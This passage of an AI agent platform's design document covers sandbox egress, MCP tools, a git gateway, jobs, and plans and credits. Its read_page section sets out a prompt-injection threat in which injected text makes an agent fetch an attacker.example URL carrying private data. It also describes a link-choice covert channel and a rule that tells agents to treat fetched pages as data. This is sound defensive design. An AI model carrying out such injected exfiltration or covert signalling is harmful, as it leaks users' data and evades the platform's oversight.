- **Route handlers use the spec's schemas** (generated TypeScript types + a validation middleware). A request that doesn't match gets a 400 with the `Error` shape.
- **Contract tests** call every endpoint and check the response against the spec.
- **The `Error` shape, pagination (`cursor`/`nextCursor`), auth (Clerk bearer) and the coupon's generic error** are all defined there; the code follows them exactly.
- **Frontend copy:** a script copies the spec to `user-frontend/ignore/openapi.yaml` (that folder is gitignored in the frontend repo). The backend copy is always the master.

---

## 2. Folders and repos

```
1_personal_agent/
├── beckend/            ← GIT REPO (the backend + docs + infra)
│   ├── README.md
│   ├── docs/mvp-hld.md, docs/deployment.md
│   ├── openapi/openapi.yaml   ← REST + webhook contract (source of truth)
│   ├── src/            api + worker (one TypeScript codebase, modules as in 1.1)
│   ├── proto-gen/      TypeScript client generated from vm-manager/proto
│   ├── migrations/     database migrations
│   └── infra/          docker-compose, Caddy, LiteLLM config, egress proxy config, backup scripts
└── vm-manager/         ← the Go service (its own repo later)
    ├── proto/vm/v1/    gRPC contract (source of truth)
    ├── cmd/, internal/ Go service
    └── agent-image/    Dockerfile for Hermes + Bridge (Bridge adapter in Python)
└── user-frontend/      ← the web app (Next.js)
    └── ignore/         gitignored: copy of openapi.yaml + platform-overview.md
```

The web app lives in `user-frontend/` and is built from `openapi.yaml` + `ignore/platform-overview.md`; it isn't covered by this doc.

---

## 3. Components and tools

| Component | Where | Language / tools | Owns |
|---|---|---|---|
| **api** | beckend | Node 22 · Hono · Drizzle · Zod · BullMQ producer · Clerk SDK · MCP TypeScript SDK · gRPC client | Webhooks, REST + SSE, Platform MCP, admin |
| **worker** | beckend | Node 22 · BullMQ worker · Drizzle · Composio SDK · Jev SDK · channel clients · gRPC client | All jobs |
| **vm-manager** | vm-manager | **Go** · gRPC · Docker Engine SDK · gVisor (`runsc`) · pgx | Container lifecycle, egress allowlists |
| **agent image** | vm-manager/agent-image | Hermes Agent + Bridge (Python) | The agent |
| Postgres 16 | infra | – | All platform data (+ LiteLLM's database) |
| Redis 7 | infra | Append-only persistence | Queues, locks, rate limits |
| LiteLLM | infra | – | Per-user AI keys, budgets, cost tracking, model routing |
| Egress proxy | infra | Squid (or Smokescreen) | The only way out of containers |
| Caddy | infra | – | HTTPS |

**External services:** Clerk, Meta WhatsApp Cloud API, Telegram Bot API, Sendblue (iMessage, enabled last), Composio, OpenRouter (cheap models), Anthropic/OpenAI (paid plans), TypeSafe **Jev** (routing decisions), **Polar** (payments, merchant of record), **Brave Search API** (Scout's web search), off-server backup storage.

---

## 4. Networks and communication

| Docker network | Members | Internet? |
|---|---|---|
| **edge** | Caddy, api | Only Caddy (80/443) |
| **platform** | api, worker, vm-manager, Postgres, Redis, LiteLLM, egress proxy | No |
| **sandbox** (internal) | user containers, egress proxy, vm-manager | No, except through the egress proxy: a short fixed list for every container, and **any public website for a container with Scout's browser on** (Max plan, section 11) |

**Rules:**
- The internet reaches only Caddy → api.
- **`/mcp` and `/git` are not reachable from the internet.** Caddy answers 404 for `/mcp*` and `/git/*`. Only user containers need those two paths, and they reach the api directly on the platform network through the egress proxy, never through Caddy. Attachment URLs under `/mcp/files/` are built from the api's internal address (`INTERNAL_API_URL`), so nothing public depends on either path.
- Containers reach **only the egress proxy**, which allows: LiteLLM, the api's `/mcp` and `/git/`, and that user's allowlisted MCP domains. `github.com` itself is **not** allowed.
- **A container with the browser on is the exception** (decided 2026-10-04, `docs/launch-plan.md` D10). Scout's browser runs inside the user's container, and a browser must reach any site. So for a **Max user whose browser is on**, the way out is opened for that one container: **it can reach any public website.**
  - **Who:** only containers the platform has switched the browser on for (`browser_enabled`, section 11.3): Max plan, and only when the server says the deployed agent image has the browser (`BROWSER_AVAILABLE`). Every other container stays locked as above. Leaving Max closes it again on the container's next wake.
  - **What stays refused for every container, browser or not:** private, loopback, link-local and metadata addresses (`169.254.169.254`), and everything on the platform's networks beyond the three services named above (Postgres, Redis, the vm-manager, other users' containers). The vm-manager and the egress proxy enforce this; it is their side of the design (`vm-manager` repo).
  - **What it costs** is in section 10.3: the container that holds the user's files, memory, cloned code and Claude sign-in now has a way out that the platform can't check.
- The worker **never** talks to containers directly; it goes through the vm-manager's *Deliver*.
- **`web_search` and `read_page` don't open the container's network.** They run in the api, which fetches for the agent and refuses private and internal addresses (section 5.1). They work the same on every plan's container. Only the browser needs the open network.
- The vm-manager's gRPC port is on the platform network only.

---

## 5. Backend: api + worker

### 5.1 api

- **Webhooks:** WhatsApp, Telegram, Sendblue, Clerk, Polar, Composio. Each one: verify → save the event (unique key) → add a job → 200. A chat webhook whose channel is switched off answers 200 and does nothing (section 0.3).
- **REST + SSE for the web app** (every endpoint, schema and error is in `openapi/openapi.yaml`): profile, link codes, channels (with the list of channels that are switched on), apps (Composio connect links), user MCP servers, approvals, chat history, **plans / checkout / credits balance / usage history / coupon redeem**, bring-your-own key, automations list, **pull-request review per repo**, agent settings (which AI pays), the **crew list**, **memory** (list, delete one, delete all).
- **Platform MCP (`/mcp`)**, called with the container token:

| Tool | Effect |
|---|---|
| send_message | Save → outbound job |
| request_approval | Save the approval → outbound job with buttons → returns "pending" |
| run_app_action | Call Composio with **the caller's user id** (forced from the token); plan limits on apps apply. A risky action needs an approved approval, except a pull-request comment covered by review being on for that repo (section 0.8). A successful action that changes something costs **1 credit** (section 7.2); it is refused at zero credits |
| list_app_actions | This user's allowed actions (connected apps × plan), each marked with whether it needs approval and whether it costs a credit |
| schedule_reminder / create_automation / list / cancel | Save + register the timer (plan limits apply) |
| get_profile | Name, timezone, plan, connected apps |
| web_search | Scout's search through the platform, for an engine with no web search of its own (section 0.7). **Max plan only:** on Free and Pro it refuses with a message for the agent. Asks the search provider (Brave) from the server and returns titles, links and snippets. **1 credit per successful search** (section 7.2) |
| read_page | Scout's page reader. Fetches one public web page from the server and returns its text and links. On Claude Code: any public address. On Hermes: only an address already seen for this user (their own messages, a `web_search` result, a link on a page already read). Free, on every plan |
| remember | Saves one short fact about the user to the shared memory (section 0.9). Refused: a secret, more than 300 characters, more than 200 memories. Free |
| recall | Finds the memories that fit a question, best match first; with no question, the latest. Free |
| forget | Removes a memory, or corrects its text. Free |

Every call is audit-logged and triggers a vm-manager *Touch*. `/mcp` is closed to the internet (section 4).

- **What needs approval** (`integrations/catalog.ts`): an action whose name has a risky word (send, reply, delete, pay, share, post, merge, close, update…), and, since 2026-10-03, a **GitHub action that writes a comment or a review** (its name has COMMENT or REVIEW and it isn't a read). Other people read those, so they count as sending to others. Comment actions of other apps are unchanged.

- **Scout's tools** (decided 2026-10-03, built 2026-10-04). They run in the api, never in the container, so they need no way out of the container.
  - **`read_page(url)`:**
    - **Which addresses it opens depends on the engine** (decided 2026-10-04, after the first live run):

      | The turn runs on | `read_page` opens |
      |---|---|
      | **Claude Code** | **Any public address** |
      | **Hermes** | **Only an address already seen for this user** (the rule below) |

      - **What went wrong with one rule for both.** On the server, Scout searched with Claude Code's built-in web search and then `read_page` refused every result (`read_page_refused`): results of the engine's own search never pass through the platform, so none of them was a "seen" address. Scout could search and could not read.
      - **Why Claude Code can be open.** On Claude Code the agent image lets **only Scout** call `read_page`: it is in Scout's tool list, it is denied to Byte and Patch, and a hook refuses the lead's own calls (`vm-manager` repo). **Scout has no files, no shell and no app tools.** So the one agent that can fetch any address holds only its task text and what it read on the web.
      - **Why Hermes stays strict.** The pinned Hermes can't narrow tools per agent (section 0.7): the lead and every specialist have `read_page`, next to files, a shell and the user's apps. There the platform's check is the only one that holds.
      - **How the platform knows the engine.** The platform can't tell which crew member calls: every call from a container carries the same container token. It does know the engine: when the worker delivers a turn it records, for that user, the engine the container really runs for it (after the wake; the engine comes from the user's settings, section 7.1), and removes the record when the turn ends. The record lasts 20 minutes at most (a turn is cut off at 15). `read_page` reads it. **No turn in progress, or the record can't be read: the strict rule.** The container can't choose its engine, and the user's settings change only from the user's own session.
      - **On Claude Code a redirect is followed to any public address.** Every hop still goes through the address checks below.
      - **Search results and page links are remembered on both engines,** so they are there when a user changes engine.
      - **In the activity log** a page read at an address that had not been seen carries `seen: false` in the entry's details.
      - **What the open rule leaves open** is in section 10.3. In short: the platform trusts the agent image's tool lists, and can't check them.
    - **The seen-address rule (Hermes)** (decided 2026-10-04). `read_page` is a way out of the container that needs no approval. Without a rule, one injected instruction (in a web page, an email, a file) could make any agent call `read_page("https://attacker.example/?d=<private data>")` and hand over the user's data, files or Claude sign-in. So the address must match, exactly after normalising, one the platform has seen for this user:
      - **(a)** an address in the **user's own messages**: their last 100 messages from the past 7 days, on any chat. Only what the user wrote counts. The agent's own messages, automation instructions (the agent writes those) and app events (an email's text) do not;
      - **(b)** a **result of `web_search`**;
      - **(c)** a **link on a page `read_page` already returned.** The tool returns a page's first 50 links for this reason.
      - **Anything else is refused,** with an error that tells the agent to search first or to ask the user for the link.
      - **Normalising** drops `http`/`https`, a leading `www.`, a trailing slash and the fragment, and nothing else: the path and the whole query string must match exactly. **The address that is fetched is the one that was seen,** not the agent's spelling of it, so the choice of spelling carries nothing.
      - **Redirects follow the same rule.** A redirect is followed only to an address that was seen, or to the same address in another spelling (`http` to `https`, with or without `www.`). Any other redirect is refused, on the same site too. This is stricter than the leak needs (a redirect's target is chosen by the site, not by the agent) and it costs some pages; it is the careful starting point and can be loosened to "same site" later.
      - **Where it is kept:** (b) and (c) in Redis, one set per user, for 24 hours, at most 500 addresses (the oldest go first). (a) is read from the user's messages when asked, so nothing is stored twice.
      - **What it does not stop.** A hostile page can offer many links, and an injected agent can signal a little by which one it opens: a few bits per read, at most 30 reads a minute. The caps (50 links a page, 500 addresses) keep that slow and the activity log shows every read. Search queries go to the search provider, not to a site.
      - **Why this rule is the one that matters on Hermes:** Scout's "search and read only" limit is only an instruction there (section 0.7), and the lead and the other specialists have `read_page` too. This check is on the platform, so it holds for every Hermes agent.
      - **Known cost:** an automation that reads a fixed page ("every morning read this page") works while the link is in the user's recent messages. After that the agent must find the page by search or ask for the link again. Keeping such links with the automation is not built.
    - **Only `http` and `https`,** on ports 80 and 443, with no user name or password in the URL.
    - **Only public addresses, on both engines.** The host is looked up, and the page is refused if **any** of its addresses is private, loopback, link-local (this covers the cloud metadata address `169.254.169.254`), carrier NAT, multicast, reserved, or the IPv6 forms of those (only global IPv6 addresses pass; IPv4 written inside an IPv6 address is refused). Host names with no dot, `localhost`, `.local`, `.internal`, and the platform's own hosts (the api, LiteLLM, the vm-manager, taken from the settings) are refused by name. A host written as a number is checked as the address it is.
    - **Checked again when connecting.** The connection is made only to the address that passed the check (the request is pinned to it; the host name is still used for the certificate), so a host can't answer "public" to the check and "private" to the connection (DNS rebinding). Every request opens its own connection.
    - **Redirects** are followed by hand, at most 5, and every hop is checked the same way from the start: the address checks here, and on Hermes the seen-address rule above.
    - **Limits:** 15 seconds in total, 2 MB of page (a longer page is read up to 2 MB and marked as cut), text types only (HTML, plain text, JSON, XML). The answer is the page's readable text (scripts, styles and markup removed), cut at 20,000 characters.
    - **What is sent:** a plain GET with a fixed user agent. No cookies, no sign-in, nothing about the user.
    - **Rate limit:** 30 pages a minute per user.
    - **The text is not trusted.** The tool's description tells the agent to treat it as information, never as instructions. Scout has no shell and no app actions (section 0.7).
    - The activity log saves the page's address without its query string. A refused address is written to the activity log too (`read_page_refused`) and to the server log, also without its query string: a refusal can be an injected instruction at work, and the user should be able to see it. On Claude Code only the address checks refuse (a private or internal address); on Hermes an unseen address does too.
    - `robots.txt` is not read: this is one page fetched for one user's question, not a crawler.
  - **`web_search(query)`:**
    - **When it is used** (decided 2026-10-04): only when the user's engine has no web search of its own (section 0.7). The platform doesn't check the engine. A Max user's call is answered and charged whichever engine made it; giving Scout the right search is the agent image's job.
    - **Max plan only** (decided 2026-10-04). The user's plan is read at every call. On any other plan the tool answers with a **tool error**, so the agent reads it and the turn goes on:
      > Web search through Textcrew is part of the Max plan, and your user is not on Max: nothing was searched and nothing was charged. If your engine has its own web search, use that instead. Otherwise tell your user that web search needs the Max plan; they can upgrade in the Textcrew web app. Do not send a link. read_page still opens an address they give you.
      - Nothing is searched and nothing is charged.
      - The refusal is written to the activity log (`web_search_refused`, with the query's first 120 characters, like a search that ran), so the user can see why Scout didn't search.
      - "Do not send a link" is the Telegram rule of section 7.6.
    - **A small provider interface,** chosen by `WEB_SEARCH_PROVIDER`. One provider is built: **Brave Search API** (`GET https://api.search.brave.com/res/v1/web/search`, key in `X-Subscription-Token`). Its "Search" plan was **$5 per 1,000 searches** when checked on 2026-10-04, with $5 of free credit each month (the first 1,000 searches) and 50 searches a second.
    - **No key set (`BRAVE_SEARCH_API_KEY`):** the tool answers that search isn't set up. It is a normal answer, not an error, so the turn goes on.
    - **Rate limit:** 20 calls a minute per user, counted before anything else, so refused calls count too. At most 10 results per search (the default is 5), each with a title, a link and a snippet.
    - **Refused at zero credits,** like an app action that changes something.
    - **Charged only on success: 1 credit per search** (section 7.2). `WEB_SEARCH_COST_USD` is the cost the charge is worked out from (default 0.004; × 2.5 it is exactly 1 credit).
    - A search the provider fails is an error the agent sees; the turn goes on and nothing is charged.
    - **The order of the checks:** rate limit → plan → is a provider set up → credits → the search → the charge.

- **App connections:** a connect link saves the connection as `pending`. Three things move it to `active` (or `expired` / `error`), whichever comes first:
  - Composio's webhook (`/webhooks/composio`),
  - the web app listing the apps, which asks Composio (this is also what happens when the browser lands on the connect return page, which is a web app page and not an api URL),
  - the **check-connection** job (section 5.2), so a connection finishes even with no webhook and no web app.

- **Git gateway (`/git/<owner>/<repo>`)**, called with the container token. It lets the agent work on a GitHub repo with normal git (clone, branch, commit, push) while the GitHub token stays on the platform:
  - The agent image's git config rewrites `https://github.com/` (and the ssh forms) to `http://api:8080/git/` and adds the container token as the `Authorization` header. So `git clone https://github.com/<owner>/<repo>` just works inside the container.
  - The api turns the container token into the user id (same as `/mcp`), takes that user's GitHub OAuth token from their **active Composio GitHub connection**, and forwards the three git smart-HTTP requests (`info/refs`, `git-upload-pack`, `git-receive-pack`) to `https://github.com/<owner>/<repo>.git`, streaming both ways. Nothing else under `/git/` is forwarded.
  - **The GitHub token never enters the container** (it is fetched per request, cached in memory for 60 s, never logged or stored). No GitHub connection → `403` with a message git prints.
  - **Push rules:** the agent may push branches, but a push that updates or deletes the repo's **default branch**, deletes any ref, or touches a tag is refused before it reaches GitHub. Changes reach the default branch through a pull request (opened with the GitHub app action via `run_app_action`).
  - Every clone/fetch/push is audit-logged (`git_fetch` / `git_push`, with the repo) and triggers a *Touch*. Per-user rate limit.
  - It is a protocol endpoint like `/mcp`, so it is described here and not in `openapi/openapi.yaml`; its errors are `text/plain` because that is what the git client shows. Like `/mcp`, it is closed to the internet (section 4).

- **Admin API** (admin role only): create or disable coupons, view users, credits and failed jobs; Bull Board.

### 5.2 worker jobs

| Job (queue) | What happens |
|---|---|
| process-message (inbound) | Take the lock → channel still on? (section 0.3) → **credit check** (section 7.5) → Jev: simple or task, apps, spam → simple: cheap model via LiteLLM → outbound; task: *WakeSandbox* → browser switch checked against the plan (section 11.3) → *Deliver* (stream until turn done). While the turn runs, its engine is on record for `read_page` (section 5.1). The delivered text starts with the memory block, and with a recap of the chat when the engine changed (section 0.9). Progress lines from the stream go to the web chat's live stream (section 0.7) |
| process-approval (inbound) | Mark the approval → Wake + Deliver the answer (with the memory block and the recap, like any turn) |
| run-automation (scheduled → inbound) | Same as process-message with the saved instruction |
| composio-trigger (inbound) | Same as process-message with the event summary. For a pull-request review automation: check the event, find the head commit, one review per head commit, then the review instruction (section 0.8) |
| send-outbound (outbound) | Send via the channel (24-hour rule → template). Nothing is sent to a channel that is switched off. On Telegram, purchase links are taken out (section 7.6) |
| create-sandbox / delete-sandbox (system) | LiteLLM key create/revoke + vm-manager Create/Delete. A new container is created with the browser on or off, by plan (section 11.3). Deleting a user also removes their memories and messages |
| sync-browser (system) | Added when a user's plan changes. Works out from the plan and the setting whether the browser should be on, and tells the vm-manager (*SetBrowser*). Safe to re-run: it sends the wanted state, not a change. No container yet: nothing to do (section 11.3) |
| check-connection (system) | Added when a connect link is created. Asks Composio for the account's status 15 s later, then after 30 s, 1 min, 2 min, 4 min and 8 min (six checks in about 16 minutes). It stops as soon as the connection is no longer `pending`. Safe to re-run: it only copies Composio's status. After the last check a connection that is still pending is left as it is; the webhook or the app list can still finish it |
| sync-usage (system, every 5 min) | LiteLLM spend + vm-manager *GetUsage* (awake seconds and browser seconds) → **charges** (section 7.4) → enforce zero balance |
| grant-monthly-credits (system) | On subscription renewal (Polar's paid renewal order) → a new monthly grant |
| expire-credits (system, hourly) | Expire grants past their end date |
| cleanup (system, daily) | Old events and messages, used link codes |
| backup (system, nightly) | Postgres dump + *SnapshotVolume* for every user → off-server |

**Job rules:** a per-user lock, 5 retries with backoff, a 15-minute turn timeout, and every step safe to repeat.

---

## 6. vm-manager (Go)

**Owns:** everything to do with Docker, plus the `sandboxes` table and the egress allowlists. Nothing else touches Docker.

**On CreateSandbox:**
- create the container from the current agent image + a /data volume
- create the container's **Platform MCP token** and **Bridge secret** (store only hashes)
- write the Hermes config (LiteLLM URL + the user's key, Platform MCP URL + token)
- write the egress allowlist
- note whether Scout's browser is on for this user (`browser_enabled`, from the backend; section 11)
- leave it stopped

**Container settings:**
- gVisor runtime
- about 600 MB RAM, 1 CPU, a process-count limit, a disk quota
- read-only system files; only /data writable
- no extra privileges
- sandbox network only
- only its own secrets

**Background loops:**

| Loop | Every | Does |
|---|---|---|
| Idle reaper | 1 min | Stop containers not in a turn and quiet 3+ min (polite) |
| Capacity guard | on each wake | Over the **configurable awake cap** → stop the longest-idle, not-busy container |
| Health checker | 30 s | Awake but not answering → restart; repeated failures → mark broken + alert |
| Reconciler | startup + 5 min | Make Docker's real state match the `sandboxes` table |
| Image rollout | on a new image version | Re-create stopped containers on their next wake (keep /data) |

**Deliver flow:**
1. Check the container is awake (wake if not).
2. POST to the Bridge with the secret.
3. Relay the Bridge's progress as stream events.
4. On *turn done*, mark it not busy, record last active, and end the stream.

A timeout (15 min) ends in a force-stop and an error event.

**Scout's browser** (section 11). The vm-manager keeps `browser_enabled` per container. The backend sets it at *CreateSandbox* and changes it with *SetBrowser*; a change takes effect on the container's next wake. A container with the browser on gets the open way out of section 4. The seconds the browser was in use are kept with each awake period and returned by *GetUsage* as `browser_seconds`.

---

## 7. Plans, credits and coupons

### 7.1 Plans

_Updated 2026-09-29 to match the pricing page: Max $30, automations 1 / 5 / 50, 90-day credits, waitlist offer; model tiers no longer advertised._
_Updated 2026-10-03 with the launch decisions (`docs/launch-plan.md`): AI three ways, 1 credit per app action that changes something, no purchase links on Telegram. Prices and credits are unchanged._
_Updated 2026-10-03 (crew package): browser use is a Max feature, a user can choose Textcrew AI over their own AI, web search is the first paid tool._
_Updated 2026-10-04 (search and browser decisions, `docs/launch-plan.md` D6, D7, D10): Scout's web search through Textcrew is a Max feature too and costs 1 credit per search; the search built into the user's own engine is free on every plan; the browser will allow logins (section 11)._
_Updated 2026-10-04 (the browser, first version): Scout's browser runs inside the user's own container, on Max, at 2 credits per minute; signing in to sites is the next step (section 11)._

| | **Free** | **Pro** | **Max** |
|---|---|---|---|
| Price | $0 | **$12 / month** | **$30 / month** |
| Credits | **100 once at sign-up** + **coupon codes** | **1,500 every month** | **4,500 every month** |
| Buy top-ups | No (use coupon codes or upgrade) | Yes: $10 = 800 credits | Yes: $10 = 800 credits |
| Textcrew AI models (in code, not advertised) | Cheap model only | All models | All models |
| Priority | – | – | **Priority when things get busy** (queue + awake cap) |
| Apps (Composio) | 10 | All 25 | All 25 + **own MCP servers** |
| Automations (a repo with pull-request review on counts as one) | 1 | 5 | 50 |
| Web search through Textcrew (Scout's `web_search`, backed by Brave; 1 credit per search) | – | – | ✓ |
| Browser use (Scout's real browser, inside the user's container; 2 credits per minute; section 11) | – | – | ✓ |
| Bring your own key | ✓ | ✓ | ✓ |
| Awake cap priority | Lowest (stopped first when the server is full) | Normal | Highest |

**Scout's two platform services are Max only** (decided 2026-10-04): web search through Textcrew, and the real browser.

- **On Free and Pro** the `web_search` tool refuses with a clear message (section 5.1). Nothing is charged. **The browser is switched off** in a Free or Pro user's container (section 11.3), so there is nothing to refuse.
- **Not a plan feature:** the web search built into the user's own engine (Claude Code on their Claude plan today; Codex later). Scout uses it on every plan, at no credits, and the platform is not involved (section 0.7).
- **`read_page` is on every plan,** and free.

**AI, three ways** (decided 2026-10-03, `docs/launch-plan.md` D4). A user picks one in the web app:

| # | Way | How it is shown | Runs | Who pays for the AI |
|---|---|---|---|---|
| 1 | **The user's own API key** | The default and the recommended choice | Hermes | The user, on their key (encrypted at rest). No AI charge in credits |
| 2 | **The user's Claude plan** | Labelled **beta**. Plain text "runs Claude Code"; no Anthropic names or logos beyond that | Claude Code, signed in by the user in their own container | The user, on their Claude plan. No AI charge in credits |
| 3 | **Textcrew AI** | Paid in credits | Hermes on a model we rent through a model API behind LiteLLM. No self-hosted model | Credits, at real cost × 2.5 (section 7.2). The plan decides which models (table above) |

- **Only the AI part is free with the user's own AI.** Awake time, app actions and paid tools are charged in credits whichever way is chosen. A web search built into the user's own engine is part of their AI: no credits.
- **First match wins:** a connected Claude plan with Claude Code chosen, then an own API key, then Textcrew AI.
- **`AI_ACCESS_MODE`:** `platform` offers Textcrew AI to a user who brought nothing. `own_only` switches Textcrew AI off; such a user is asked to connect their own AI first.
- **Choosing Textcrew AI anyway** (decided 2026-10-03). A user who has saved a key or connected a Claude plan can still pick Textcrew AI, and switch back:
  - The user's **AI preference** is `auto` (the first-match rule above) or `platform` (use Textcrew AI). It is saved with the agent settings; the default is `auto`.
  - With `platform` chosen, Hermes runs on Textcrew AI and **the AI is charged in credits**, although a key is saved or a Claude plan is connected. The key and the Claude connection are kept, so switching back to `auto` needs no new sign-in.
  - **Only when Textcrew AI is on offer** (`AI_ACCESS_MODE=platform`). The agent settings say so (`platformAvailable`). In `own_only` the choice is refused (`409`), and a preference saved earlier is ignored: the `own_only` rules are unchanged.
  - **Connecting a Claude plan** sets the preference back to `auto`: the user has just chosen Claude Code.
- Codex comes later.

**Waitlist offer:** waitlist members get **50% off their first month** of Pro ($6) or Max ($15), applied automatically at checkout (a Polar discount applied by id at checkout, once per waitlist entry, verified email only).

### 7.2 What a credit is and what costs credits

**1 credit = $0.01 of price.** Prices are about **2.5× our real cost**.

| Usage | Charge |
|---|---|
| Textcrew AI (via LiteLLM) | Real cost × 2.5, rounded up per turn. Not charged when the user brings their own AI (section 7.1) |
| Container awake time | 1 credit per 10 minutes awake |
| **App action that changes something** (send, create, update, delete) | **1 credit per successful action** |
| App action that only reads (get, list, search) | Free |
| **Web search through Textcrew** (`web_search`, backed by Brave) | **1 credit per successful search** (Max plan) |
| Web search built into the user's own engine (Claude Code on their Claude plan; Codex later) | Free. It runs on the user's own plan; the platform is not involved |
| Browser use (Scout's real browser) | 2 credits per minute of browser time (Max plan; section 11.4). Awake time is charged as well while the browser runs |
| Other paid tools (pay-per-use APIs) | Their cost × 2.5. None yet besides web search |
| Reading a web page (`read_page`) | Free |
| Jev routing, simple replies | Included in the AI cost |
| **Failed turns caused by us** (our bug or outage) | **Not charged**; the charge is reversed |

**App actions** (decided 2026-10-03, `docs/launch-plan.md` D6):

- **What counts as changing something.** Decided per action, in this order (`integrations/catalog.ts`):
  1. It needs approval (risky by name: send, delete, pay, share…) → it changes something.
  2. Its name has a write word (CREATE, ADD, UPDATE, SET, EDIT, MARK, UPLOAD, …) → it changes something.
  3. Its name has a read word (GET, LIST, SEARCH, FIND, FETCH, READ, QUERY, …) and no write word → it only reads. Free.
  4. Its name has neither: Composio's own `readOnlyHint` tag on the tool, when it is there → it only reads. Free.
  5. Anything else → it changes something. **An unknown action is charged.**
- **Only success is charged.** An action that Composio refuses or that fails costs nothing.
- **At zero credits** an action that changes something is refused before it runs. Reading still works.
- **A turn reversed as our fault** gives back the app-action credits charged during that turn, with the rest of the turn.
- **Everyone pays it,** including users on their own API key or Claude plan.

**Web search: 1 credit per search** (decided 2026-10-04, `docs/launch-plan.md` D6). Before, a search was charged at Brave's price × 2.5: 1.25 credits, so 1, 1, 1 and 2 credits for four searches.

- **How it is 1 credit:** web search still goes through the paid-tool path below, which charges a configured cost × 2.5. The configured cost of a search (`WEB_SEARCH_COST_USD`) is now **$0.004**. × 2.5 that is $0.01: exactly one credit, with no fraction to carry. So every successful search is exactly 1 credit, also for a user who has older paid-tool charges.
- **The setting is what the price is worked out from, not Brave's bill.** Brave charges us $0.005 a search, so a search is sold at 2× its cost, not 2.5×. The ledger row keeps the 4,000 micro-dollars the charge was worked out from (`meta.costMicroUsd`).
- **On the server:** a line `WEB_SEARCH_COST_USD=0.005` left in the server's settings would bring back 1.25 credits. Remove it or set 0.004.
- **Not charged:** a search refused for the plan (not on Max), a search the provider fails, and a search with no provider set up.

**Paid tools** (decided 2026-10-03):

- **The price is the tool's configured cost × 2.5,** as for the AI. For web search the configured cost is $0.004, so the price is 1 credit (above).
- **Credits are whole numbers, so fractions carry over,** the way awake time does: the platform keeps the user's running total of paid-tool cost and charges each whole credit as it is reached. A tool that costs $0.005 a call would be 1 credit for three calls and 2 for the fourth: 5 credits for 4 calls, exactly × 2.5. A call never costs less than 1 credit.
  - **Where the running total lives:** in the ledger. Each paid-tool charge saves what the call cost us (`meta.costMicroUsd`), and the next charge adds up the user's earlier ones under the user's credit lock. There is no separate counter to drift.
- **Only success is charged.** A search the provider refuses, one that isn't set up, or one refused for the plan costs nothing.
- **At zero credits** a paid tool is refused before it runs.
- **A turn reversed as our fault** gives back the paid-tool credits charged during that turn.
- **Everyone pays it,** including users on their own API key or Claude plan.
- **Which grants pay:** normal grants only. A coupon grant with the cheap-model flag doesn't pay for paid tools (section 7.7).

### 7.3 Grants: where credits come from, and expiry

Credits are held as **grants**. Each grant has an amount, **what's left of it**, a source and an expiry. Every change is also written to the **credit ledger** (append-only).

| Source | Amount | Expires |
|---|---|---|
| Sign-up | 100 | **90 days** after the grant |
| Coupon | Set per coupon | **90 days** after redemption (or the coupon's setting) |
| Monthly plan | 1,500 / 4,500 | **90 days** after the grant: unused monthly credits carry over |
| Top-up purchase | 800 per $10 | **90 days** after the grant |
| Admin adjustment | Any | 90 days, unless the admin sets another date |
| Refund / chargeback | Negative | – |

- **Balance** = the sum of what's left in all unexpired grants.
- **Every credit lasts 90 days from the day it's granted**, whatever the source.
- **Spending order:** always spend from the grant that **expires soonest** first (so the oldest credits go first), so users lose as little as possible.

### 7.4 Charging (how usage becomes charges)

1. **Every 5 minutes**, *sync-usage* reads new AI spend per user from LiteLLM, and new awake seconds and browser seconds from the vm-manager (*GetUsage*).
2. It turns them into credits (section 7.2) and writes **one charge per user per sync**, with a unique key per (user, period), so a re-run can't double-charge.
3. The charge is taken from grants in the spending order, and the ledger records each part.
4. **After each turn** (on *turn done*), the worker also does a quick sync for that user, so the balance stays fresh.
5. **App actions are charged when they run,** not by the sync: one charge of 1 credit per successful action that changes something, through the same grants and ledger. Each charge has its own unique key, so it can be written only once: the approval id when the action was approved (an approval is single use), otherwise an id made for that one run. The charge shows in the credit history (`App action: <name>`), in the activity log (`creditsCharged`) and in usage (`appActionCredits`).

6. **Paid tools are charged when they run** too, the same way: one charge per successful call, with its own unique key, through the same grants and ledger (`Web search`, 1 credit). It shows in the credit history, in the activity log (`creditsCharged`) and in usage (`toolCredits`).
7. **Usage is reported in five parts:** AI, awake time, app actions, browser time and paid tools (`aiCredits`, `awakeCredits`, `appActionCredits`, `browserCredits`, `toolCredits`). Browser time has its own number so screens can label it; the total is the sum of the five.
8. **Browser time is charged by the sync,** like awake time (section 11.4): **30 seconds of browser time is 1 credit** (2 credits per minute). Part minutes carry over between syncs, so nothing is rounded up and nothing is lost. It is part of the one charge per user per period, so a re-run can't charge it twice. Each usage period keeps its `browserSeconds` and `browserCredits`.

### 7.5 Enforcing the balance

| Where | Check |
|---|---|
| **Before a turn** (process-message) | Balance > 0? If not → reply "out of credits" and where to top up, upgrade or redeem a coupon; no container wake. On Telegram the reply names the web app and carries **no link** (section 7.6); other channels get the billing link |
| **During a turn** | The user's **LiteLLM key budget = their current balance in dollars of real cost**. If they run out mid-turn, LiteLLM refuses → Hermes stops → "out of credits" |
| **Before a web search through Textcrew** | On the Max plan? If not → the tool tells the agent that web search is part of Max, and to use the engine's own search if it has one. The search does not run and nothing is charged |
| **Before an app action that changes something, or a paid tool** | Balance > 0? If not → the tool tells the agent the user is out of credits and the action or search does not run |
| **The browser** | No check of its own. The browser only runs inside a turn, and a turn does not start at zero credits (first row): the container is not woken. Inside a turn it is not cut off; the turn is (15 minutes at most), and the overrun is recovered from the next grant |
| **At zero after a sync** | Set the LiteLLM budget to 0; pause automations |
| **When credits are added** (payment, coupon, monthly grant) | Raise the LiteLLM budget; un-pause automations |

A small negative balance (one turn's overrun) is allowed and recovered from the next grant.

### 7.6 Payments with Polar

- **On the website only** (decided 2026-10-03, `docs/launch-plan.md` D9). Plans and top-ups are bought in the web app. **The Telegram bot never sends a purchase link:** Telegram requires Telegram Stars for digital goods sold inside the app, and a bot that sells another way can be hidden from mobile users.
  - A message to Telegram that would carry a checkout, top-up, upgrade or billing link names the web app instead, with no URL: "Open the Textcrew web app to top up or upgrade".
  - As a safety net, the Telegram sender also replaces any purchase link in an outgoing text (the agent's own messages too) with "the Textcrew web app". A purchase link is a Polar URL, or a web app URL under `/billing`, `/pricing`, `/checkout`, `/upgrade`, `/plans`, `/topup` or `/subscribe`.
  - Other channels keep their links. Links that sell nothing (settings, linking a chat) stay on Telegram too.
- **Checkout:** web → api creates a Polar checkout session for the chosen plan or top-up (user id as `external_customer_id` and in the metadata) → Polar's hosted page.
- **Webhooks** (Polar event names):

| Event | Action |
|---|---|
| `subscription.active` (or the first `order.paid`) | Set plan → grant the monthly credits → raise the budget |
